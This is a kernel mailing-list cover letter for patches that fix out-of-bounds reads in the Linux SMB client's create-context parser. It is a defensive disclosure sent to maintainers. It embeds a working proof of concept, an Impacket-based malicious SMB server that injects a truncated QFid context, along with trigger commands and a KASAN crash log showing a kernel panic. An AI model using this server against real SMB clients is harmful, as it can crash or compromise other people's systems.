Received: from mail-pf1-f180.google.com (mail-pf1-f180.google.com [209.85.210.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1CBC13F1653
	for <linux-cifs@vger.kernel.org>; Fri,  4 Sep 2026 14:05:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788530731; cv=none; b=lmyaltGYAjeFwSS9EySPkgZ1+tk+A2S72VSMncMmpr71Tbes9BobjnkAtrzJcYkH6WctSM6K0QsDUWn1yc5nVwQyWXX78QkYk/CMrdR+iGZNFfpeeKUieEa9mUd6yDBFedBir/Jv03mPrxhExo+RabjnlD5izTviMnAekQXNDaI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788530731; c=relaxed/simple;
	bh=8wvnNEYuQycJKfXD6Y//xDf5BBF/sSEm13hDE2EJXZg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version:Content-Type; b=Idfa10ZRX8zNWuamwOXgZ1UTo9Gd9SB/M5SwbVIkmGvVPAgs+uHQDuIKWDZPU96nNE8aYuCBookra/jJxKA74lLmD4F70zP4HToA4NJhElIoFbjKy2dZfhz3CcXDOlIYOPSKixYiamPAPuBJvHmzsdXpHClmASuQczPuie9FetU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=CcHkU5NU; arc=none smtp.client-ip=209.85.210.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="CcHkU5NU"
Received: by mail-pf1-f180.google.com with SMTP id d2e1a72fcca58-84e27035206so851039b3a.3
        for <linux-cifs@vger.kernel.org>; Fri, 04 Sep 2026 07:05:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788530728; x=1789135528; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=s7jV+ugOye2aVc3nMrHQxGfnhbFQUSQPc6j7lgnm6Jc=;
        b=CcHkU5NUrDNNMTWQTxh356gzmBreWw5VRGnnvmdM4lkSMmuQAbFtkEvEhqA9a0R0rp
         k3o5M6YCAwugh1AOhXu+IUYqtFJbkxcd6yaAW3kzXi3bB25nnrPToC9QGbEuoOgRjFJl
         2jzXT2VWNF49/ex5XbtYiRkytmQ7550kzqL/r9gWQj63Tw/PrTdYbEXQazyQJ7i0Q+ba
         hUnrVBq9F/QA4QbwLg+OToJ5mCURpzzrhKo8w6nrNcWrZqEVzi8DYyrOLSLgFmj3tfZS
         OV9IAG71QWKAg7SErnLF+F1PKRLFCJTpM/Hycu/enLXy828l2v5pYZEN/FmevV2K7XYk
         OMHA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788530728; x=1789135528;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=s7jV+ugOye2aVc3nMrHQxGfnhbFQUSQPc6j7lgnm6Jc=;
        b=WdJmR+g3dcTAVdwVfowsK8ay0hbB09u+GlE+uPQbiHACjITYpFyi7wMPbuZ/KzCs2e
         gbaK+ifeT1LM2vGxl2WvLVE7xg5sK8JcNo4vknPBG3yTB1+vicbFR4LPIEbkdlAMPzy8
         8dN2WxSRPoFtqQB12syURQmD6LwqG8EKn/7D7vpMrQ92TgWYxqm4gF+9mEPW3z32iPus
         gnkGr1OYQZLFlD00R0gpRhNurm0GsKhdo6gZgmzYelY6ku3lCnov3My1+YrgMG4mgZbw
         5/gpyz4cHqfHIa8O98MXPecJKEjWIs328GO/iR07yElbjoXddVecNM33/6vHsq4CMOOC
         mkyQ==
X-Forwarded-Encrypted: i=1; AKwUvBzokzvqPKOQ54OY1WONJtzVb15cswu61HKHvIJb228xlt6u1aslKSWA6EXRBXy1V1ciw0QkMlTSndNQ@vger.kernel.org
X-Gm-Message-State: AFuF++nj4bVhxzIg3a/N+HDbAIqtnfHCO2weq1uYgLChuAg+Dj7hce2k
	ZzM6BR1lZ+U96sY98vKSVDQFT4Fxoswv64Rds/arKg/21eOxFwXVVXTBkcEg72GSe15p
X-Gm-Gg: AYBFou08QgJy2VCCWhvdTn+nMDaeDIFkz8jyH11goJrYJGA9wzVYeRjEW/iMcsHKvZh
	QeFWrxctaF3uoDee/aBw3fOsVRrEMbgh7VZKflUVoc7+PZH2xbHksaaRQVzwoeanALVXbRaT+ev
	Fig1QX2TnHbZ3wWPQj5coqok0VIBsjp9TiNpNTyykQ+0uF97sGhpd0dNLnBCc3HA74f8wAl5IeN
	ZJ0QBBxRzkTrbO23cjmJx9hbQ2jj8albCj4KvuvPooR+x40x3Vlyubnkzzjstcm5iy7fSmsdfiB
	upJDSPQEeUQQIXTQAYRk+zPuP66GqfChcpd51AqjqS61cKThL/ySc+1RekMaAETlp7Nl95ye8Oc
	RHdPjdK781eocLMHMIX+CUcDLjG3dn4bnZd4gzi6iyHXA2wmMtCK9yxwDfjid90fxQHUpZlJlxG
	XoIlqlTmJtS8TKJfOUzjeJex/m/wK7ALi3rF5YOj3zgjCui9cJf6C1JXrm1xz85fs1IYTgA7RHI
	VCsRmwLIkvsFp0776U=
X-Received: by 2002:a05:6a00:1950:b0:85c:3922:25d5 with SMTP id d2e1a72fcca58-8616aa68194mr8935830b3a.21.1788530727149;
        Fri, 04 Sep 2026 07:05:27 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-86153e3ac30sm1165524b3a.56.2026.09.04.07.05.21
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 04 Sep 2026 07:05:26 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Steve French <sfrench@samba.org>
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Paulo Alcantara <pc@manguebit.org>,
	Ronnie Sahlberg <ronniesahlberg@gmail.com>,
	Shyam Prasad N <sprasad@microsoft.com>,
	Tom Talpey <tom@talpey.com>,
	Bharath SM <bharathsm@microsoft.com>,
	Pavel Shilovsky <pshilovsky@samba.org>,
	Aurelien Aptel <aaptel@suse.com>,
	linux-cifs@vger.kernel.org,
	samba-technical@lists.samba.org,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org
Subject: [PATCH v3 0/2] smb: client: fix create context out-of-bounds reads
Date: Fri,  4 Sep 2026 14:05:16 +0000
Message-ID: <cover.1788516372.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in fs/smb/client/smb2pdu.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.
The malicious server can be operated by a non-root user in a user and net
namespace. The guest-side CIFS mount in this validation is performed as root
because CIFS does not set FS_USERNS_MOUNT.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The reproduced crash is a truncated QFid create context. Generic layout
checks accept DataLength 0, then parse_query_id_ctxt() still reads
DiskFileId through a full response-structure cast and crosses the
cifs_small_rq object.

smb2_parse_contexts() also does not bound each context record by its
Next field before dispatching to a handler. The SMB2 lease parser reads
LeaseFlags after LeaseState, so a short lease context can pass the
generic checks and still be handed to smb2_parse_lease_buf(). Patch 1
bounds each context by Next, validates the QFid payload length, and
extends the SMB2 lease minimum through LeaseFlags. The embedded PoC and
KASAN report show the truncated QFid path; the Next and lease checks
close sibling parser holes in the same function.

parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking
that the POSIX context contains those fields. Current in-tree
smb2_open_file() passes a NULL posix pointer into SMB2_open(), so this
handler is not reached on the ordinary open path. Patch 2 still adds a
handler-level minimum DataLength check and keeps the existing
soft-failure behavior for malformed optional metadata.

Please accept my apologies for the follow-up. I posted v2 on 23 Aug 2026
and have not received a reply, so I am resending the series as v3. There
are no functional code changes versus v2.

changes in v3:
  - Resend after no response on v2; no functional code changes.
  - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@nebusec.ai/
changes in v2:
  - Bound each response context by Next and reject malformed chains.
  - Read QFid DiskFileId only when DataLength covers the payload.
  - Extend the SMB2 lease minimum through the LeaseFlags field.
  - Add a POSIX handler check for the three fixed fields.
  - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac26f660956.1782579150.git.xizh2024@lzu.edu.cn/

Fixes history follows the separate root causes: the pre-existing Next/lease
parser path and the later QFid path are listed in patch 1, while patch 2
points to the original POSIX create-context parser introduction.

The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
response. packetdrill is not used because it cannot provide the required
stateful SMB server behavior or perform this server-side response rewrite.

Reproducer:

    unshare -Urn ./poc.sh

Host (malicious SMB server, unprivileged user/net namespace):

    unshare -Urn ./poc.sh

Guest (KASAN kernel, root):

    mount -t cifs //10.0.2.2/SHARE /mnt/test -o user=,password=,vers=2.0,sec=ntlmssp,port=4445,noperm,soft
    cat /mnt/test/probe >/dev/null

The wrapper creates a local virtual environment and installs Impacket when
needed before running poc.py.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
VENV_DIR="$SCRIPT_DIR/.venv-impacket"

if [[ ! -x "$VENV_DIR/bin/python" ]]; then
    python3 -m venv "$VENV_DIR"
    "$VENV_DIR/bin/pip" install impacket
fi

exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
------END poc.sh--------

------BEGIN poc.py------
#!/usr/bin/env python3
import logging
import signal
import struct
from pathlib import Path

from impacket import smbserver
from impacket import smb3structs as smb2
from impacket.nt_errors import STATUS_SUCCESS


PORT = 4445
SHARE_NAME = "SHARE"
TARGET_NAME = "probe"
TARGET_OFFSET = 424
CONTEXT = struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
ALIGN_PAD = b"\x00" * (TARGET_OFFSET - 152)


def prepare_share(share_dir: Path) -> None:
    share_dir.mkdir(parents=True, exist_ok=True)
    (share_dir / "placeholder").touch()
    (share_dir / TARGET_NAME).write_bytes(b"x")


def main() -> None:
    base_dir = Path(__file__).resolve().parent
    share_dir = base_dir / "share"
    prepare_share(share_dir)

    logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(message)s")

    original = smbserver.SMB2Commands.smb2Create

    def malicious_smb2_create(conn_id, smb_server, recv_packet):
        req = smb2.SMB2Create(recv_packet["Data"])
        raw_name = req["Buffer"][: req["NameLength"]]
        name = smbserver.normalize_path(raw_name.decode("utf-16le"))

        commands, packets, error = original(conn_id, smb_server, recv_packet)
        print(f"CREATE name={name!r} err=0x{error:08x}", flush=True)

        if error == STATUS_SUCCESS and name == TARGET_NAME:
            resp = commands[0]
            resp["CreateContextsOffset"] = TARGET_OFFSET
            resp["CreateContextsLength"] = len(CONTEXT)
            resp["AlignPad"] = ALIGN_PAD
            resp["Buffer"] = CONTEXT
            print(
                f"injected truncated QFid context; packet_len={64 + len(resp.getData())}",
                flush=True,
            )

        return commands, packets, error

    smbserver.SMB2Commands.smb2Create = staticmethod(malicious_smb2_create)

    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=PORT)
    server.setSMB2Support(True)
    server.addShare(SHARE_NAME, str(share_dir), readOnly="yes")
    server.setLogFile("/dev/stdout")

    print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=True)
    print("Trigger file: probe", flush=True)

    signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).throw(SystemExit(0)))
    try:
        server.start()
    except (KeyboardInterrupt, SystemExit):
        pass


if __name__ == "__main__":
    main()
------END poc.py--------

The following crash excerpt is from the decoded output generated by
scripts/decode_stacktrace.sh with the matching vmlinux and source tree.

﻿----BEGIN crash log----
[   12.012483] ==================================================================
[   12.013639] BUG: KASAN: slab-out-of-bounds in smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.014787] Read of size 8 at addr ffff88800d564c00 by task cat/234
[   12.015758] 
[   12.016034] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
[   12.016038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   12.016040] Call Trace:
[   12.016043]  <TASK>
[   12.016044]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   12.016050]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[   12.016054]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock.h:122 (discriminator 4))
[   12.016058]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016060]  kasan_report (mm/kasan/report.c:595)
[   12.016062]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016064]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016067]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
[   12.016069]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
[   12.016072]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
[   12.016076]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
[   12.016078]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
[   12.016081]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
[   12.016084]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
[   12.016087]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
[   12.016091]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.016094]  smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.016097]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
[   12.016099]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
[   12.016102]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
[   12.016106]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
[   12.016109]  ? kasan_save_stack (mm/kasan/common.c:57)
[   12.016112]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.016119]  ? kasan_save_track (mm/kasan/common.c:78)
[   12.016122]  ? _raw_spin_lock_irqsave (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:111 include/linux/spinlock.h:187 include/linux/spinlock_api_smp.h:133 kernel/locking/spinlock.c:166)
[   12.016131]  ? __pfx_lockref_get (??:?)
[   12.016137]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.016142]  ? do_dentry_open (fs/open.c:947)
[   12.016146]  do_dentry_open (fs/open.c:947)
[   12.016152]  vfs_open (fs/open.c:1052)
[   12.016157]  path_openat (fs/namei.c:4700 fs/namei.c:4863)
[   12.016164]  ? __pfx_path_openat (fs/namei.c:4805)
[   12.016169]  do_file_open (fs/namei.c:4892)
[   12.016173]  ? __pfx_do_file_open (fs/namei.c:4618)
[   12.016196]  ? alloc_fd (include/linux/spinlock.h:390 fs/file.c:610)
[   12.016203]  ? do_getname (fs/namei.c:198)
[   12.016207]  do_sys_openat2 (fs/open.c:1368 (discriminator 1))
[   12.016213]  ? __pfx_do_sys_openat2 (fs/open.c:1257)
[   12.016217]  ? __pfx___do_sys_newfstat (fs/stat.c:456)
[   12.016224]  __x64_sys_openat (fs/open.c:1374 fs/open.c:1390 fs/open.c:1385 fs/open.c:1385)
[   12.016229]  ? __pfx___x64_sys_openat (fs/open.c:1378)
[   12.016235]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   12.016241]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   12.016247] RIP: 0033:0x7f4fe3e7f1c7
[   12.016253] Code: 25 00 00 41 00 3d 00 00 41 00 74 47 64 8b 04 25 18 00 00 00 85 c0 75 6b 44 89 e2 48 89 ee bf 9c ff ff ff b8 01 01 00 00 0f 05 <48> 3d 00 f0 ff ff 0f 87 95 00 00 00 48 8b 4c 24 28 64 48 2b 0c 25
All code
========
   0:	25 00 00 41 00       	and    $0x410000,%eax
   5:	3d 00 00 41 00       	cmp    $0x410000,%eax
   a:	74 47                	je     0x53
   c:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  13:	00 
  14:	85 c0                	test   %eax,%eax
  16:	75 6b                	jne    0x83
  18:	44 89 e2             	mov    %r12d,%edx
  1b:	48 89 ee             	mov    %rbp,%rsi
  1e:	bf 9c ff ff ff       	mov    $0xffffff9c,%edi
  23:	b8 01 01 00 00       	mov    $0x101,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	0f 87 95 00 00 00    	ja     0xcb
  36:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  3b:	64                   	fs
  3c:	48                   	rex.W
  3d:	2b                   	.byte 0x2b
  3e:	0c 25                	or     $0x25,%al

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	0f 87 95 00 00 00    	ja     0xa1
   c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  11:	64                   	fs
  12:	48                   	rex.W
  13:	2b                   	.byte 0x2b
  14:	0c 25                	or     $0x25,%al
[   12.016258] RSP: 002b:00007ffefc4f6030 EFLAGS: 00000246 ORIG_RAX: 0000000000000101
[   12.016265] RAX: ffffffffffffffda RBX: 0000561e1464f634 RCX: 00007f4fe3e7f1c7
[   12.016269] RDX: 0000000000000000 RSI: 00007ffefc4f6ede RDI: 00000000ffffff9c
[   12.016272] RBP: 00007ffefc4f6ede R08: 0000000000000001 R09: 0000000000000000
[   12.016275] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
[   12.016278] R13: 00007ffefc4f6318 R14: 0000000000000000 R15: 0000000000020000
[   12.016282]  </TASK>
[   12.016285] 
[   12.065221] Allocated by task 232:
[   12.065778]  kasan_save_stack (mm/kasan/common.c:57)
[   12.066421]  kasan_save_track (mm/kasan/common.c:78)
[   12.067212]  __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   12.067836]  kmem_cache_alloc_noprof (include/linux/kasan.h:253 mm/slub.c:4584 mm/slub.c:4917 mm/slub.c:4931)
[   12.069428]  mempool_alloc_noprof (mm/mempool.c:559)
[   12.070177]  cifs_small_buf_get (fs/smb/client/misc.c:237 (discriminator 2))
[   12.070797]  allocate_buffers (fs/smb/client/connect.c:659)
[   12.071430]  cifs_demultiplex_thread (fs/smb/client/connect.c:1281)
[   12.072170]  kthread (kernel/kthread.c:436)
[   12.072778]  ret_from_fork (arch/x86/kernel/process.c:158)
[   12.073592]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   12.074318] 
[   12.074646] The buggy address belongs to the object at ffff88800d564a40
[   12.074646]  which belongs to the cache cifs_small_rq of size 448
[   12.076729] The buggy address is located 0 bytes to the right of
[   12.076729]  allocated 448-byte region [ffff88800d564a40, ffff88800d564c00)
[   12.079436] 
[   12.079712] The buggy address belongs to the physical page:
[   12.080845] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff88800d5651c0 pfn:0xd564
[   12.082977] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[   12.084130] flags: 0x100000000000240(workingset|head|node=0|zone=1)
[   12.085595] page_type: f5(slab)
[   12.086420] raw: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
[   12.087847] raw: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
[   12.089515] head: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
[   12.090958] head: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
[   12.092304] head: 0100000000000001 ffffffffffffff81 00000000ffffffff 00000000ffffffff
[   12.094665] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   12.095841] page dumped because: kasan: bad access detected
[   12.097003] 
[   12.097835] Memory state around the buggy address:
[   12.099253]  ffff88800d564b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.100390]  ffff88800d564b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.102134] >ffff88800d564c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   12.103515]                    ^
[   12.104394]  ffff88800d564c80: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00
[   12.105856]  ffff88800d564d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.107468] ==================================================================
[   12.110319] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[   12.112041] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
[   12.113570] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   12.116267] Call Trace:
[   12.116691]  <TASK>
[   12.117097]  vpanic (kernel/panic.c:651)
[   12.117667]  ? __pfx_vpanic (kernel/panic.c:362)
[   12.118611]  ? preempt_schedule_irq (kernel/sched/core.c:7556)
[   12.120045]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.120831]  panic (kernel/panic.c:788)
[   12.121342]  ? __pfx_panic (kernel/panic.c:742)
[   12.121990]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
[   12.122652]  end_report (mm/kasan/report.c:227)
[   12.123305]  kasan_report (mm/kasan/report.c:597)
[   12.124037]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.124851]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.125619]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
[   12.126257]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
[   12.127035]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
[   12.127765]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
[   12.128403]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
[   12.129117]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
[   12.129863]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
[   12.130942]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
[   12.134088]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.136608]  smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.137833]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
[   12.138800]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
[   12.140451]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
[   12.141281]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
[   12.141882]  ? kasan_save_stack (mm/kasan/common.c:57)
[   12.142556]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.143287]  ? kasan_save_track (mm/kasan/common.c:78)
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (2):
  smb: client: fix create context out-of-bounds reads
  smb: client: validate POSIX create context length

 fs/smb/client/smb2pdu.c | 43 ++++++++++++++++++++++++++++++++++-------
 1 file changed, 36 insertions(+), 7 deletions(-)

-- 
2.43.0
